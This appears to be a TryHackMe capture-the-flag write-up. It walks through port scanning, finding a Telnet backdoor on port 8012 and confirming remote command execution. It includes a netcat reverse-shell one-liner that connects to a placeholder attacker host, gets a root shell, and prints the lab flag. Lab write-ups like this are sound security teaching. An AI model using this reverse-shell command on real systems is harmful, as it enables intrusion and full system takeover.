# Telnet Backdoor Exploitation (TryHackMe)

## Overview
This lab demonstrates the discovery and exploitation of an insecure Telnet-based
backdoor service. The objective was to enumerate open ports, identify an unknown
service, achieve remote command execution, and obtain root access.

---

## Enumeration

Initial SYN scan of the target:
```bash
nmap -sS -Pn <target-ip>
```

The scan revealed an unusual open port:
```text
8012/tcp open unknown
```

Service detection on the discovered port:
```bash
nmap -sV -p 8012 <target-ip>
```

Service banner returned:
```text
SKIDY'S BACKDOOR. Type .HELP to view commands
```

Based on the banner, the service appeared to be a custom backdoor allowing
remote command execution.

---

## Initial Access

A connection to the service was established using Telnet:
```bash
telnet <target-ip> 8012
```

Available commands were listed:
```text
.HELP
.RUN <command>
.EXIT
```

The `.RUN` command allowed execution of system commands on the target.

---

## Command Execution Verification

To verify command execution, ICMP traffic was monitored on the attacker machine:
```bash
sudo tcpdump ip proto \\icmp -i ens5
```

A ping command was executed through the Telnet session:
```text
.RUN ping <attacker-ip> -c 1
```

ICMP packets were observed, confirming remote command execution.

---

## Exploitation (Reverse Shell)

A Netcat reverse shell was executed via the backdoor:

```bash
.RUN mkfifo /tmp/clivlc; nc <attacker-ip> 4444 0</tmp/clivlc | /bin/sh >/tmp/clivlc 2>&1; rm /tmp/clivlc
```

A listener was started on the attacker machine:
```bash
nc -lvnp 4444
```

A reverse shell connection was successfully received.

---

## Post-Exploitation

System information:
```bash
id
pwd
```

Output confirmed root privileges:
```text
uid=0(root) gid=0(root) groups=0(root)
```

File system enumeration:
```bash
ls
```

The flag file was found and read:
```bash
cat flag.txt
```

Flag:
```text
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

---

## Security Notes

- Telnet transmits data in plaintext and is inherently insecure
- Exposed backdoors often lead to full system compromise
- Banner grabbing can reveal critical attack vectors
- Proper firewalling and service hardening are essential

---

## Conclusion

This lab highlights the importance of thorough port scanning and service
enumeration. Even a single exposed backdoor service can result in complete
system takeover.
